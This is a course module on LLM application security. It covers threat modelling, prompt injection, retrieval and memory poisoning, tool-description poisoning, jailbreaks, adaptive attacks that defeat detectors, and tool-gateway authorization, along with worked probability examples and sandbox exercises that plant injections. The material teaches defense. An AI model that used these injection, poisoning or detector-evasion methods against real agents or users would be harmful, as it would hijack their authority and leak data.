# Module 18 — AI Security

## 00 Why This Module Exists

An LLM reads instructions and data in the same token stream. Any text that reaches its context—user input, a retrieved page, an email, a tool result—can influence what it outputs and which actions it chooses. When that output is rendered, executed, or turned into a tool call carrying real credentials, a text-level manipulation becomes a system-level compromise. AI security is the discipline of modeling where untrusted text enters, which privileged sinks it can reach, and which architectural controls hold even when the model is fooled.

```text
untrusted sources                     model                    privileged sinks
user input / web / email / docs --> [ context ] --> output --> renderer / SQL / shell / fetch
retrieved corpus / tool outputs         |                      tool calls with credentials
                                        v
                        authority check per action (principal, intent, provenance)
                        sandbox + egress allowlist + limits + audit
```

Module 12 introduced authority policy for tool calls and the budget reservation ledger; Module 13 the validation ladder; Module 16 adaptive search. This module owns the inference-time threat model and security controls. Module 23 owns operational detection and incident response. Module 19 owns training-time data and checkpoint poisoning and harmful fine-tuning in adaptation pipelines (Lesson 19.4); here an adaptation data feed is only one more untrusted source in the source–sink graph, and those attacks are not taught again.
**Research cutoff:** 2026-09-30. Papers quoted with numbers were re-read in full text on 2026-10-01; see the experiment cards in Section 05.

**Module Orientation**
- **Engineering Problem**: Keep an LLM system's data and authority safe when some of its inputs are written by adversaries and the model itself cannot be trusted to tell instructions from data.
- **What You Will Do**: Build a source–sink threat model, execute direct/indirect injection and retrieval poisoning in a sandbox, evaluate detectors under adaptive attack, implement per-action authorization, an egress policy proxy, and a per-principal budget ledger, trace AgentDojo, and diagnose an exfiltration incident.
- **Environment**: Python 3.10+, an isolated agent sandbox with mock email/files/banking tools, a small vector store, AgentDojo or equivalent harness, a network egress proxy with a sandbox-only resolver and listener, and no production credentials.
- **Evidence Rule**: Keep source observations (**O**), explicit derivations (**D**), and telemetry-dependent hypotheses (**H**) separate. Every rate in a worked example is synthetic unless it carries an experiment-card reference (EC-1 to EC-14). All attack work runs only in authorized sandboxes, with canary values instead of real secrets and reserved names (`.example`, `.test`) instead of real endpoints.
- **If You Only Have One Week**: Lessons 18.1, 18.2, 18.4 — they map sources, sinks, and authority, demonstrate injection and poisoning, and enforce per-action authorization that survives model compromise; probabilistic defenses, output handling, and red teaming build on those three.

## 01 Baseline Assumptions

- Modules 09–10: retrieval ranking and top-$k$ (Lessons 9.2, 9.6), and evidence assembly with stage attribution (Lessons 10.3, 10.5).
- Module 12: tool contracts (Lesson 12.2), the budget reservation ledger with the invariant $C+R\le B$ (Lesson 12.3), and authority with effect verification (Lesson 12.5). Lesson 18.5 reuses the ledger and does not re-derive it.
- Module 13: structured output and the validation ladder (Lessons 13.3, 13.5).
- Module 14: durable effects and idempotent activities (Lesson 14.2).
- Module 15: experimental unit and paired comparison (Lessons 15.1, 15.4), used when two configurations are compared on the same tasks.
- Module 16: falsification contracts and adaptive, stochastic evidence (Lessons 16.1, 16.5).

## 02 Target Mastery

```yaml
depth_contract:
  conceptual: REQUIRED
  mechanistic: REQUIRED
  mathematical: SELECTIVE
  quantitative: REQUIRED
  implementation: REQUIRED
  source_code: REQUIRED
  instrumentation: REQUIRED
  experimental: REQUIRED
  statistical: SELECTIVE
  production_reasoning: REQUIRED
  failure_analysis: REQUIRED
  falsification: REQUIRED
  security: REQUIRED
  economics: SELECTIVE
  architecture_tradeoff: REQUIRED
  research_connection: REQUIRED

estimated_effort:
  instruction: 6h        # sum of lesson instruction estimates: 40+70+60+65+65+60 min
  guided_practice: 2.5h  # sum of in-lesson practice: 20+25+25+20+35+25 min
  labs: 12.5h            # LAB A 2.5h + LAB B 3h + LAB C 3h + LAB D 4h
  assessment: 3h         # Mastery transfer problem 2.5h + Incident 18.1 0.5h
  source_trace: 2h       # Lesson 18.6 pinned trace, LAB C trace step, and the Section 09 artifact are one activity, counted once here
  total: 26h
```
Each category is counted once. The source trace is not also counted as Lesson 18.6 practice, LAB C time, or assessment time.

The learner must model trust boundaries and source–sink paths, execute and explain injection and poisoning, evaluate probabilistic defenses against adaptive attackers, design authority and output controls that do not depend on the model's judgment, and report security with utility under attack.

---

### LAYER 1: KNOWLEDGE / INSTRUCTIONAL LAYER

## 03 Knowledge Map

Assets & Principals $\to$ Trust Boundaries $\to$ Untrusted Sources $\to$ Model Context $\to$ Output & Tool Calls $\to$ Privileged Sinks. Attacks: direct injection, indirect injection, retrieval poisoning, jailbreak, output-channel exfiltration, resource exhaustion. Controls, from weakest guarantee to strongest: prompt-level marking $\to$ detectors/filters $\to$ output encoding/sandbox/egress $\to$ per-action authorization $\to$ control/data separation and path removal. Evaluation: benign utility, utility under attack, adaptive attack success, audit evidence.

## 04 Lessons

### Lesson 18.1 — Threat Modeling LLM Systems: Sources, Sinks, Authority

**Engineering Question:**
Which untrusted texts can reach which privileged actions, and under whose authority do those actions run?

**Concepts & Definitions:**
- **Asset**: data, money, credentials, reputation, compute budget.
- **Principal**: user, operator, service, third-party content author, attacker.
- **Trust boundary**: where data crosses between principals with different authority.
- **Source**: any path by which text enters model context. **Sink**: any interpreter or action consuming model output.
- **Taxonomy**: the OWASP Top 10 for LLM Applications 2025 lists Prompt Injection, Sensitive Information Disclosure, Supply Chain, Data and Model Poisoning, Improper Output Handling, Excessive Agency, System Prompt Leakage, Vector and Embedding Weaknesses, Misinformation, and Unbounded Consumption (**O**, CLM-002). Use it to prompt enumeration, not as a completed threat model.

**Mechanism Explanation:**
Because no architectural instruction/data separation exists inside the model, risk is set by the source–sink graph (**D**, CLM-001). Draw the data-flow diagram; mark each source as trusted/untrusted and each sink by blast radius; record the credential each sink uses. A path "untrusted source → context → sink with sensitive authority or egress" is an attack path until a control breaks it.

**Quantitative Model / Derivation:**
Attack paths $\approx |S_{untrusted}|\times|K_{reachable}|$ after authorization filtering, where $K_{reachable}$ are sinks callable after untrusted content enters context. Removing a source class or sink class removes every path through it; adding a detector only lowers the probability on each path.

- *where:* $S_{untrusted}$ is the set of untrusted source classes; $K_{reachable}$ is the set of sinks still callable once untrusted text is in context; $|\cdot|$ is the number of elements in a set.
- *Why a product.* A candidate path is one (source, sink) pair, so the count is the number of pairs. The product is exact only when every untrusted source can reach every listed sink; otherwise count the reachable pairs one by one, and the product is an upper bound.
- *Why removal beats detection.* Removing one source class takes away $|K_{reachable}|$ pairs (a whole row); removing one sink class takes away $|S_{untrusted}|$ pairs (a whole column). A detector removes no pair: each pair stays in the count with a lower, attacker-searchable success probability.

**Worked Example** (a design exercise; no measurement):
- *Input.* An email assistant.
  - Sources: user message (trusted), inbox messages (untrusted), attachments (untrusted), web fetch (untrusted).
  - Sinks: `send_email` (external egress), `read_files` (sensitive read), Markdown renderer (image URLs are egress), calendar write (low sensitivity, not counted below).
- *Steps.* Count untrusted source × egress-or-sensitive sink: $|S_{untrusted}|=3$ (inbox, attachments, web fetch) and $|K_{reachable}|=3$ (`send_email`, `read_files`, renderer), so $3\times3=9$ candidate paths. Requiring explicit user confirmation of recipients on `send_email` cuts its 3 paths. Rendering images only through the policy proxy of Lesson 18.5 cuts the renderer's 3 paths to unauthorized hosts.
- *Result.* $9-3-3=3$ residual paths, all through `read_files`.
- *Interpretation and limits.*
  - `read_files` cannot send data out by itself. It matters because it puts sensitive data in context for any egress sink that remains, so a sensitive read and an egress sink must be analysed as a pair.
  - "Cut" means the path now needs a control to fail. Confirmation can be fatigued, and an allowed host can still receive data (the residual risk in Lesson 18.5).
  - The count is a completeness aid, not a risk score. Paths differ in blast radius.

**Knowledge Check:**
1. Why is a rendered Markdown image a sink?
2. Why does the OWASP list not by itself tell you your top risk?

**Guided Practice:**
Draw the source–sink graph for a RAG support bot with a ticket-creation tool and list every path with its credential.

**Feedback Contract:**
- *Expected Output*:
  - Knowledge Check 1: rendering makes the client fetch a URL chosen by model output, so data can leave in the request without any tool call.
  - Knowledge Check 2: the list names risk classes. Which one dominates depends on this system's sources, sinks, and credentials.
  - Guided Practice: a table with at least these sources: user message, retrieved knowledge-base passages, ticket history, and any attachment or web content. Sinks: ticket creation (writes under a service credential and may notify external parties), the answer renderer, and any fetch. Every row names the credential used and the control that cuts the path.
- *Common Failure*: Treating only the user prompt as untrusted, or omitting the renderer because it is "not a tool".
- *Diagnostic Hint*: Who wrote each piece of text in the final context, and which component makes a network request because of model output?
- *Concept to Revisit*: Authority and Effect Verification (Module 12, Lesson 12.5).

**Learning Outcome:**
Produce a source–sink threat model that exposes attack paths and the authority behind each sink.

*(Effort: 40m instruction, 20m practice)*

---

### Lesson 18.2 — Prompt Injection, Retrieval Poisoning, and Jailbreaks

**Engineering Question:**
How do attacker-authored instructions and facts reach the model, and why doesn't alignment stop them?

**Concepts & Definitions:**
- **Direct prompt injection**: the user supplies instructions that override the operator's intent.
- **Indirect prompt injection**: adversaries place instructions in data the application will later retrieve; Greshake et al. demonstrated data theft, worming, ecosystem contamination, and manipulated API use against real 2023 systems (**O**, CLM-003).
- **Retrieval poisoning**: the attacker writes passages into the corpus so that a target question returns a target answer. PoisonedRAG states two conditions a malicious text must meet: it must be retrieved for the target question, and the model must produce the target answer when the text is in context. With five injected texts per target question and top-5 retrieval, its authors report attack success of 0.74–0.99 across three corpora of 2.7–8.8 million texts and eight models (**O**, CLM-004; author-reported, experiment card EC-1). These are rates for 100 chosen closed-ended questions per corpus, not a prevalence estimate for any deployed system.
- **Jailbreak**: bypassing safety behavior; Zou et al. showed optimized adversarial suffixes can transfer to other aligned models, including black-box ones (**O**, CLM-005).
- **Three events that must not be merged**, for one trial of a target query against a poisoned corpus:
  - $R$ — *retrieved*: at least one poisoned passage is in the context actually sent to the model. This is read from the context log, not inferred from the answer.
  - $T$ — *target match*: the answer contains the attacker's target answer. This is observable from the output alone.
  - $A$ — *causal adoption*: the answer matches the target *because of* a poisoned passage in context. It is not directly observable. It is estimated from controls and provenance (below).
- **Agent-specific injection channels (2025–2026 primary papers; all author-reported, none reproduced here; cards EC-6 to EC-14 in Section 05)**. The same mechanism—attacker text reaches the context—arrives through sources that the older threat models treated as trusted configuration or as the agent's own past:
  - *Tool-description (metadata) poisoning*: instructions placed in a tool's description are loaded into context when a tool server registers, before any user task. In MCPTox the poisoned tool is never called; the instruction steers the agent to misuse a *legitimate* tool, and the authors report a mean ASR of 36.5% across 20 agent settings with refusals under 3%, using non-adaptive, template-generated cases (**O**, CLM-023). A second benchmark reports near-100% ASR for some models in a sandbox with side-effect checks (**O**, CLM-024).
  - *Tool-selection hijacking*: a crafted tool document added to a tool library is retrieved and selected for a target task without the attacker seeing the library, retriever, or model (**O**, CLM-025).
  - *Memory poisoning*: records written into an agent's long-term memory are later retrieved as demonstrations or context. One attack writes them through ordinary queries to a memory bank shared across users (**O**, CLM-026); another writes them through a web page the agent merely viewed, then activates in a later task on a different site (**O**, CLM-027).
  - *Visual injection*: instructions rendered on screen reach computer-use agents through screenshots, so text-level filters on HTML never see them (**O**, CLM-028).

**Mechanism Explanation:**
Indirect injection works because the model conditions on all context tokens; an instruction inside a retrieved page is just more text. Poisoning works because retrieval ranks by similarity, and an attacker can craft text similar to the target query that also carries the desired claim or instruction. Jailbreak transfer shows that alignment is a learned tendency, not an enforced boundary. None of these requires breaking cryptography or code—only write access to some source.

The agent channels change *when* and *with what standing* the attacker's text arrives. Tool metadata enters before the user speaks and is read as part of the agent's configuration. Memory records are read as the agent's own prior experience, and they persist across tasks, so the attack and its effect can be separated in time and site. A tool-selection attack does not ask the model to do anything unusual; it makes the attacker's tool the plausible choice. In every case the model sees text it cannot authenticate, and the defense question is where authority is decided—Lesson 18.4 analyses each channel.

A target match has more than one possible cause. The model may already hold the target answer as prior knowledge. A response cache may replay an answer produced by an earlier poisoned run. Another document, such as a stale legitimate page, may state the same thing. Each is an *alternate path* from some source to the answer. Finding $T$ without $R$ is therefore a finding to investigate, not a row to delete.

**Quantitative Model / Derivation** (**D**, CLM-016):
By the law of total probability over $R$:

$$
P(T)=P(R)\,P(T\mid R)+P(\neg R)\,P(T\mid\neg R).
$$

*where:* $R$, $T$ are the events defined above; $\neg R$ is "no poisoned passage in the delivered context", so $P(\neg R)=1-P(R)$; $P(T\mid R)$ is the probability of $T$ among trials where $R$ occurred; $\wedge$ means "and" (both events in the same trial).

*Step-by-step.* Every trial falls in exactly one of $R$ or $\neg R$, so the target-match trials split into two disjoint groups: $P(T)=P(T\wedge R)+P(T\wedge\neg R)$. By the definition of conditional probability, $P(T\wedge R)=P(R)\,P(T\mid R)$ and $P(T\wedge\neg R)=P(\neg R)\,P(T\mid\neg R)$. Substituting gives the equation. In counts: target matches $=$ (matches with $R$) $+$ (matches without $R$).

- $P(R)$ has all trials as its denominator.
- $P(T\mid R)$ has only the trials where $R$ occurred as its denominator. This is the "follow" rate. Dividing target matches by *all* trials gives $P(T)$, which is a different number.
- The retrieved path contributes $P(R)\,P(T\mid R)$. The older shorthand $p_r\,p_f$ equals $P(T)$ only when $p_f$ means $P(T\mid R)$ and $P(T\mid\neg R)=0$.
- With $m$ poisoned passages, $P(R)=1-\prod_i(1-p_{r,i})$ holds only if the passages are retrieved independently. Passages crafted for the same query are similar, so measure $R$ per trial instead of composing per-passage rates.
  - *where:* $p_{r,i}$ is the per-trial retrieval rate of poisoned passage $i$, and $\prod_i$ multiplies over $i=1,\dots,m$. *Steps:* $1-p_{r,i}$ is the chance passage $i$ is missed; under independence all $m$ are missed with probability $\prod_i(1-p_{r,i})$; $R$ is the complement. Example: two passages at 0.5 each give $1-0.5\times0.5=0.75$. If the two are near-duplicates that are retrieved together or not at all, the true $P(R)$ is 0.5, so the formula overstates it.

Two controls give the alternate-path terms a value:

- **No-poison control**: the same queries, seeds, and decoding settings on the clean corpus. Its target-match rate $P_0(T)$ is what prior knowledge and other documents produce without the attack.
- **No-retrieval control**: the same queries with retrieval disabled and the cache bypassed. Its target-match rate is what the model produces from its own parameters.

The attributable effect of poisoning is estimated by $P(T)-P_0(T)$ on matched trials. Here $P(T)$ is the target-match rate on the poisoned corpus and $P_0(T)$ the rate on the clean corpus with the same queries, seeds, and decoding; the subtraction removes the matches that would have happened without the attack. "Adoption without retrieval is impossible" is true only by definition: it holds if $A$ is defined as causation through the retrieval path *and* that path is the only way poisoned text reaches the answer. A cache breaks the second condition.

**Worked Example** (synthetic counts, registry CLM-020; no system was measured):
- *Input.* A 10,000-document sandbox corpus is seeded with 5 passages written for "What is the refund window?" that assert "90 days"; the true policy is 30 days. Retrieval is top-5. There are 50 paraphrases × 4 seeds = 200 trials, each logging the delivered context, passage IDs, cache status, and answer.
- *Step 1 — contingency table.*

| | $T$ (answer says 90 days) | $\neg T$ | Total |
|---|---:|---:|---:|
| $R$ (poisoned passage in context) | 96 | 24 | 120 |
| $\neg R$ | 4 | 76 | 80 |
| Total | 100 | 100 | 200 |

- *Step 2 — rates with their denominators.*
  - $P(R)=120/200=0.60$.
  - $P(T\mid R)=96/120=0.80$.
  - Retrieved-path contribution: $0.60\times0.80=0.48$ (96 of 200).
  - $P(T\mid\neg R)=4/80=0.05$.
  - Check: $0.48+0.40\times0.05=0.50=P(T)=100/200$. Here $0.40=P(\neg R)=80/200$, and $0.40\times0.05=0.02$ is the 4 of 200 matches without retrieval; $96+4=100$.
- *Step 3 — controls.* No-poison control: 6 of 200 answers say 90 days, so $P_0(T)=0.03$. No-retrieval control: 5 of 200, so $0.025$.
- *Step 4 — provenance of the four $T\wedge\neg R$ trials.* Two were served from a response cache filled by earlier poisoned trials; the cache key ignored the corpus version. One cites a stale legitimate page that still says 90 days. One has no supporting passage.
- *Result.* Poisoning raised target match from 0.03 to 0.50, an estimated attributable difference of 0.47 ($0.50-0.03$, i.e. about 94 of 200 trials). Of the 100 matches, 96 had a poisoned passage in context in that trial and 2 were replayed from the cache.
- *Interpretation and limits.*
  - Multiplying $P(R)$ by the unconditional $P(T)$ gives $0.60\times0.50=0.30$. That number describes nothing in the table.
  - The 24 trials with $R$ but not $T$ show retrieval without a target match. That is consistent with model-side resistance or with competing passages, and the table alone cannot tell which.
  - The two cache trials are poisoned answers that the retrieval log calls clean. Dropping them as "impossible" would hide a real path. The fix is a cache key that includes the corpus version, and a provenance field on cached answers.
  - Within the $R\wedge T$ cell, some answers might have matched anyway. The control puts that at about 3 in 100 trials, which is why the result is stated as a difference.
  - The 200 trials are 50 clusters of 4. An interval must resample paraphrases, not rows (Module 15, Lesson 15.1). No interval is given here because the counts are invented.

**Knowledge Check:**
1. Why is indirect injection possible even when the user is benign?
2. A report says "retrieval rate 0.60, adoption rate 0.50, so attack success is 0.30". Which denominator is wrong?
3. An answer matches the target and the context log shows no poisoned passage. Name three paths to check.
4. MCPTox divides successful attacks by *valid* outputs; VPI-Bench divides by *all* attack samples. Why can the two rates not be compared directly?

**Guided Practice:**
In the sandbox, place one indirect injection in a tool result that asks for a `send_email` call to a sandbox address. Record whether the model attempts the call, and whether the gateway (Lesson 18.4) would authorize it. Then recompute the worked example with the cache disabled: the two cache trials become $\neg T$.

**Feedback Contract:**
- *Expected Output*:
  - Knowledge Check 1: the application, not the user, places third-party text in context.
  - Knowledge Check 2: 0.50 is $P(T)$ over all trials. The conditional rate is $96/120=0.80$, and the retrieved-path contribution is 0.48.
  - Knowledge Check 3: model prior (no-retrieval control), response cache, another document in the corpus.
  - Knowledge Check 4: excluding invalid outputs raises the rate for models that often produce malformed output; the denominators describe different populations, and the attack sets, agents, and judges also differ.
  - Guided Practice: the table becomes $R$: 96/24, $\neg R$: 2/78. $P(T)=98/200=0.49$, $P(T\mid\neg R)=2/80=0.025$, and $0.48+0.40\times0.025=0.49$.
  - For the injection: location, attempted action, and gateway decision, over a stated number of paraphrases and seeds.
- *Common Failure*: Reporting "the model resisted" from one trial; dividing target matches by all trials and calling it the follow rate; deleting target matches that lack retrieval.
- *Diagnostic Hint*: For each rate, say its denominator in words. Does your no-poison control ever produce the target answer?
- *Concept to Revisit*: Stage attribution (Module 10, Lesson 10.5); stochastic evidence (Module 16, Lesson 16.5).

**Learning Outcome:**
Execute and explain injection and poisoning mechanisms, including tool-metadata, tool-selection, memory, and visual channels, and report retrieval, target match, and estimated causal adoption with their own denominators and controls.

*(Effort: 70m instruction, 25m practice)*

---

### Lesson 18.3 — Probabilistic Defenses and Adaptive Attackers

**Engineering Question:**
What do prompt-level defenses and detectors actually buy, and how must they be evaluated?

**Concepts & Definitions:**
- **Spotlighting**: input transformations (delimiting, datamarking, encoding) that mark where untrusted text begins and ends. Its authors report that, against a fixed corpus of 1,000 documents carrying a keyword-payload injection, attack success on GPT-family models fell from above 50% to below 2% (**O**, CLM-006; author-reported, static attack, experiment card EC-2). The paper itself warns that delimiting is easy to subvert once the attacker knows the system prompt.
- **Detector**: a classifier on inputs or tool outputs (e.g., AgentDojo's `TransformersBasedPIDetector` defaults to a DeBERTa prompt-injection model).
- **Static attack**: a fixed set of attack inputs written without access to the deployed defense, each tried once.
- **Adaptive attack**: a search that optimizes against the deployed defense with a stated budget and stated feedback. Nasr et al. evaluate 12 defenses and report attack success above 90% for most of them, where most had originally reported near-zero success (**O**, CLM-007; author-reported, experiment card EC-3). In their AgentDojo experiments the search attack had up to 800 queries per scenario on an 80-sample subset. Spotlighting's success rate there was 0–28% under the benchmark's static attack and 47–99% under search, depending on the model. With *no added defense* the same four models were at 75–100% under the same search, so the comparison that matters is defended-adaptive against undefended-adaptive, not against the static number.
- **ASR@budget**: attack success reported together with attempts per case, what the attacker observes, and what the attacker knows. Without these three, two ASR values cannot be compared.
- **More adaptive evidence (2025–2026)**:
  - Zhan et al. re-tested eight indirect-injection defenses (two detectors, perplexity filtering, three prompt-level defenses, paraphrasing, adversarial fine-tuning) on a 100-case InjecAgent subset with white-box adaptive strings trained for up to 500 steps, and report ASR above 50% against every one (**O**, CLM-029; EC-10). Their adaptive attacker knows and can differentiate through the defense, which is a stronger assumption than a remote attacker usually has.
  - LLMail-Inject ran a public challenge in which participants knew the deployed defenses and could submit freely. Of 370,724 phase-1 submissions, 3,018 (0.8%) were end-to-end successes; the funnel shows the deeper stages are where most attempts failed (**O**, CLM-030; EC-11). A low per-submission rate is not a low risk: one success is enough, and the organisers report that some defenses needed a few hundred attempts before the first success.
    - *Why a low rate still means high risk (illustrative arithmetic, not from the paper).* If each attempt independently succeeds with probability $p$, the chance of at least one success in $n$ attempts is $1-(1-p)^n$. With $p=0.008$ and $n=100$: $1-0.992^{100}\approx0.55$. Real attackers learn from feedback, so attempts are not independent and the true chance is usually higher.
  - Narisetty et al. re-ran one out-of-band defense (Progent) on an AgentDojo subsample with a hand-crafted, defense-aware template and report mean ASR 25.8% undefended, 4.2% defended, 2.6% under their adaptive template, at a utility cost from about 45% to about 26% (**O**, CLM-031; EC-12). The authors themselves call it one small data point that does not establish robustness against an optimized attack.

**Mechanism Explanation:**
Defenses that rely on the model or a classifier recognizing malice are probabilistic. They lower opportunistic success, add latency and false positives, and can be optimized against. Evaluate them with the attacker moving second: fixed attack strings are a smoke test, not evidence of robustness. An empirical evaluation cannot prove a defense robust. It can only report that a search of a stated strength failed to break it.

**Quantitative Model / Derivation:**
If detectors had independent miss rates $1-d_i$, residual $=\prod_i(1-d_i)$. Independence is an assumption to test on the joint data, not a default. An adaptive attacker searches for inputs that evade all layers jointly, creating correlated misses; the residual must be measured on the composition (**D**, CLM-008). Also account for the benign false-positive rate $f$ of the *composed* stack: at request volume $V$, $fV$ legitimate requests are blocked or degraded. If either of two detectors can block, the composed $f$ lies between the larger single rate and the sum of the two.

*where:* $d_i$ is detector $i$'s catch (detection) rate on attack inputs, so $1-d_i$ is its miss rate; $\prod_i$ multiplies over the stacked detectors; "residual" is the fraction of attack inputs that pass every layer; $f_i$ is detector $i$'s false-positive rate on benign requests, $f$ the stack's; $V$ is benign requests per period.

*Step-by-step.*
1. An attack input gets through the stack only if *every* layer misses it. If misses were independent, the joint miss probability would be the product of the single miss probabilities.
2. A benign request is blocked if *any* layer flags it. The stack flags at least as many as its busiest single detector, so $f\ge\max(f_1,f_2)$. Adding the two rates counts requests flagged by both twice, so $f\le f_1+f_2$. In short: $\max(f_1,f_2)\le f\le f_1+f_2$.
3. The overlap is recoverable: requests flagged by both $=f_1+f_2-f$. Independence would predict $f=1-(1-f_1)(1-f_2)$.

**Worked Example** (synthetic counts, registry CLM-020; no detector was measured):
- *Input.*
  - Static set: 400 attack inputs, each tried once. Detector 1 misses 20 and detector 2 misses 20, so each catches 95%.
  - Adaptive run: 50 scenarios, 500 queries per scenario, with the attacker shown both detectors' block/allow decisions.
  - Benign traffic: 1,000,000 requests per day. Each detector alone flags 1.0%; the stack flags 1.6%.
- *Steps.*
  1. Each detector misses $20/400=0.05$, so $d_1=d_2=0.95$. Independence predicts a joint miss rate of $0.05\times0.05=0.0025$, which is 1 input in 400.
  2. The joint log shows 6 inputs missed by both: $6/400=1.5\%$, six times the prediction. The misses are correlated even before any adaptation.
  3. The adaptive search finds at least one input that passes both detectors and achieves the attacker goal in 30 of 50 scenarios: ASR@500 $=60\%$.
  4. Benign cost: $0.016\times1{,}000{,}000=16{,}000$ legitimate requests blocked or degraded per day. The bounds are 10,000 and 20,000 ($\max(0.01,0.01)\times V$ and $(0.01+0.01)\times V$). Overlap: $0.01+0.01-0.016=0.004$, so 4,000 benign requests per day are flagged by both detectors; independence would predict $1-0.99^2=0.0199$, i.e. only 100 flagged by both.
- *Result.* Static joint residual 1.5%, adaptive ASR@500 60%, benign false positives 1.6%.
- *Interpretation and limits.* The stack is useful depth against opportunistic traffic and is not a boundary. The 60% and the 1.5% have different denominators (scenarios against inputs) and different attacker budgets, so their ratio means nothing. A different budget or different feedback would give a different adaptive number. An undefended adaptive baseline is needed before crediting the stack with any reduction.

**Knowledge Check:**
1. Why does a near-zero ASR on a static benchmark say little about an adaptive attacker?
2. Where should detector false positives appear in the release decision?
3. Two reports give "ASR 4%" and "ASR 35%" for the same defense. What three facts decide whether they disagree?

**Guided Practice:**
Evaluate a detector on a static injection set, then run a budgeted adaptive search (paraphrase + random search) against it in the sandbox. Report both ASRs, the false-positive rate on benign traffic, and the query budget.

**Feedback Contract:**
- *Expected Output*:
  - Knowledge Check 1: the static set was not chosen against this defense, so it samples none of the inputs an optimizer would find.
  - Knowledge Check 2: as a utility cost in the same table as ASR, at the composed stack's rate and the real request volume.
  - Knowledge Check 3: attempts per case, attacker feedback, and attacker knowledge. Also check that the denominators are the same cases.
  - Guided Practice: a table with static ASR (inputs, one attempt each), adaptive ASR@budget (scenarios, queries per scenario, feedback given), an undefended adaptive baseline, composed benign FPR with its sample size, added latency, and a list of what the result does not show.
- *Common Failure*: Multiplying miss rates of stacked layers; comparing a defended static ASR with an undefended static ASR and calling the difference robustness.
- *Diagnostic Hint*: Did the attacker see the defense's decisions? How many queries per case? What does the undefended system score under the same search?
- *Concept to Revisit*: Stochastic, adaptive, and fault-injection evidence (Module 16, Lesson 16.5).

**Learning Outcome:**
Evaluate probabilistic defenses under adaptive attack with a stated budget and baseline, and report their costs.

*(Effort: 60m instruction, 25m practice)*

---

### Lesson 18.4 — Authority: Confused Deputies, Least Privilege, and Control/Data Separation

**Engineering Question:**
How do we keep an agent's legitimate authority from being directed by text it read?

**Concepts & Definitions:**
- **Confused deputy**: Hardy's privileged program induced to misuse its own authority because it acted on a caller-supplied name with ambient privileges (**O**, CLM-009).
- **Agent as deputy**: an agent executing tools with full user/service credentials after reading attacker content is a confused deputy unless each action is authorized against the originating principal and data provenance (**D**, CLM-010). OWASP calls the enabling condition Excessive Agency.
- **Capability**: authority bound to a specific object and operation, passed explicitly.
- **Control/data separation**: CaMeL derives control and data flow from the trusted query, handles untrusted data in a quarantined model that cannot call tools, and enforces capability policies at tool calls. Its authors report 77% of AgentDojo tasks solved with CaMeL against 84% for the same model with native tool calling (**O**, CLM-011; author-reported, FRONTIER, experiment card EC-4). That pair is one model's row. Across the six model rows of the same table the change in benign utility ranges from −3.1 to −32.0 percentage points.

**Mechanism Explanation:**
A tool gateway sits between model and tools. For each call it checks: (1) scope—is this tool and object within the capability granted for this task? (2) provenance—did arguments (recipient, URL, amount) come from the trusted user query or from untrusted data? (3) risk—does the action need explicit confirmation? (4) budget—does the reservation fit the authenticated principal's ledger (Lesson 18.5)? Arguments tainted by untrusted data cannot choose high-risk targets without confirmation. Control/data separation takes this further: the plan comes only from trusted input; untrusted data may fill values but cannot add steps.

What the guarantee covers must be read from the design, not from the headline. CaMeL's stated threat model excludes attacks that change only the text shown to the user, and its authors report side channels and leave formal verification of the interpreter to future work (EC-4). A gateway has the same shape of limit: it constrains actions, and it does not make a summary truthful.

**Quantitative Model / Trade-off Comparison:**
Report each configuration as (benign utility, utility under attack, ASR), with the attack protocol stated. For CaMeL, $84.5\%\to77.3\%$ on 97 user tasks is 82 → 75 tasks, a cost of 7 tasks for that model on that benchmark (**D** from the reported percentages; $0.845\times97=81.97\approx82$ and $0.773\times97=74.98\approx75$). The same design costs another model in the same table 32 points, including a fall from 60% to 0% on the travel suite. Your cost depends on how often tasks need untrusted data to choose the next action, and on how well the planning model handles undocumented tool outputs. Hypothesis to test (**H**, CLM-015): cutting one leg of source–sensitive data–sink removes more adaptive exfiltration than adding another detector at matched utility cost.

**Attack-to-Defense Analysis for Agent Channels** (attack and paper-defense columns **O** from cards EC-3 and EC-6 to EC-14; control column **D**, CLM-032; any claim that a control holds under adaptive attack is **H**, CLM-033):

Each row asks the source–sink questions of Lesson 18.1: which untrusted source, which sink, whose authority, and which assumption the attack breaks. The "Paper-evaluated defense" column reports only what the cited authors measured, inside their scope. The derived controls are this module's derivation. None of them has been evaluated here.

| Attack class (card) | Source → sink, authority | Assumption broken | Paper-evaluated defense (**O**) | Derived control (**D**) | Residual risk | Sandbox test and adaptive budget |
|---|---|---|---|---|---|---|
| Tool-description poisoning (EC-6, EC-7) | Tool metadata loaded at registration → a *legitimate* high-privilege tool, run with the agent's credential | Tool descriptions are trusted configuration | A guardrail filter changed ASR from 0.997 to 0.844 for one model and from 0.980 to 0.998 for another (EC-7). MCPTox only proposes defenses | Pin each reviewed tool manifest by content hash and refuse a changed manifest until re-reviewed. Authorize every call by task capability and per-argument provenance, never by description text. Treat values introduced by a description as tainted | A reviewed description that is malicious but plausible. Parameter changes that stay inside the granted scope | Sandbox tool server with canary data. Cases: call redirection, implicit trigger, parameter tampering, description changed after pinning. Pass: zero dispatched calls outside capability, every hash change refused. Adaptive: 50 description rewrites per case, gateway decisions visible to the attacker |
| Tool-selection hijacking (EC-8) | Third-party tool document in a retrievable library → the attacker's tool is selected and executed | Retrieval plus model choice selects the right tool | The authors evaluated StruQ, SecAlign, and four detectors and report them insufficient. Perplexity detection missed 90% of gradient-optimized documents at under 1% false positives | Restrict selection to an allowlist of reviewed tools per task capability. Record the publisher for each tool document. An unreviewed tool receives no credential | An attacker tool already inside the reviewed set. Displacement of the correct tool (denial of service) | Insert shadow-optimized tool documents into a sandbox library. Measure selection rate and dispatched calls to unreviewed tools. Adaptive: a stated number of optimization iterations against a shadow pipeline |
| Memory injection by queries (EC-9) | Attacker's own queries → records written to a memory bank shared across users → the victim's later reasoning | Stored records are trusted past experience; shared memory is benign | Prompt-level detection was either precise for one agent and missed the others, or general with false positives up to 34/50. The authors argue that per-user isolation and rate limits can be evaded by identity disguise or coordination; they did not test this | Partition memory by authenticated principal. Record write provenance (principal, source, whether derived from untrusted content). A record from another principal or with untrusted provenance cannot supply arguments for a privileged action | Poisoning within one principal's own memory. Weak authentication, which defeats any partition | Two sandbox principals. The attacker principal submits a query sequence; measure victim-query ASR with and without partition. Adaptive: number of attacker queries and identities, stated |
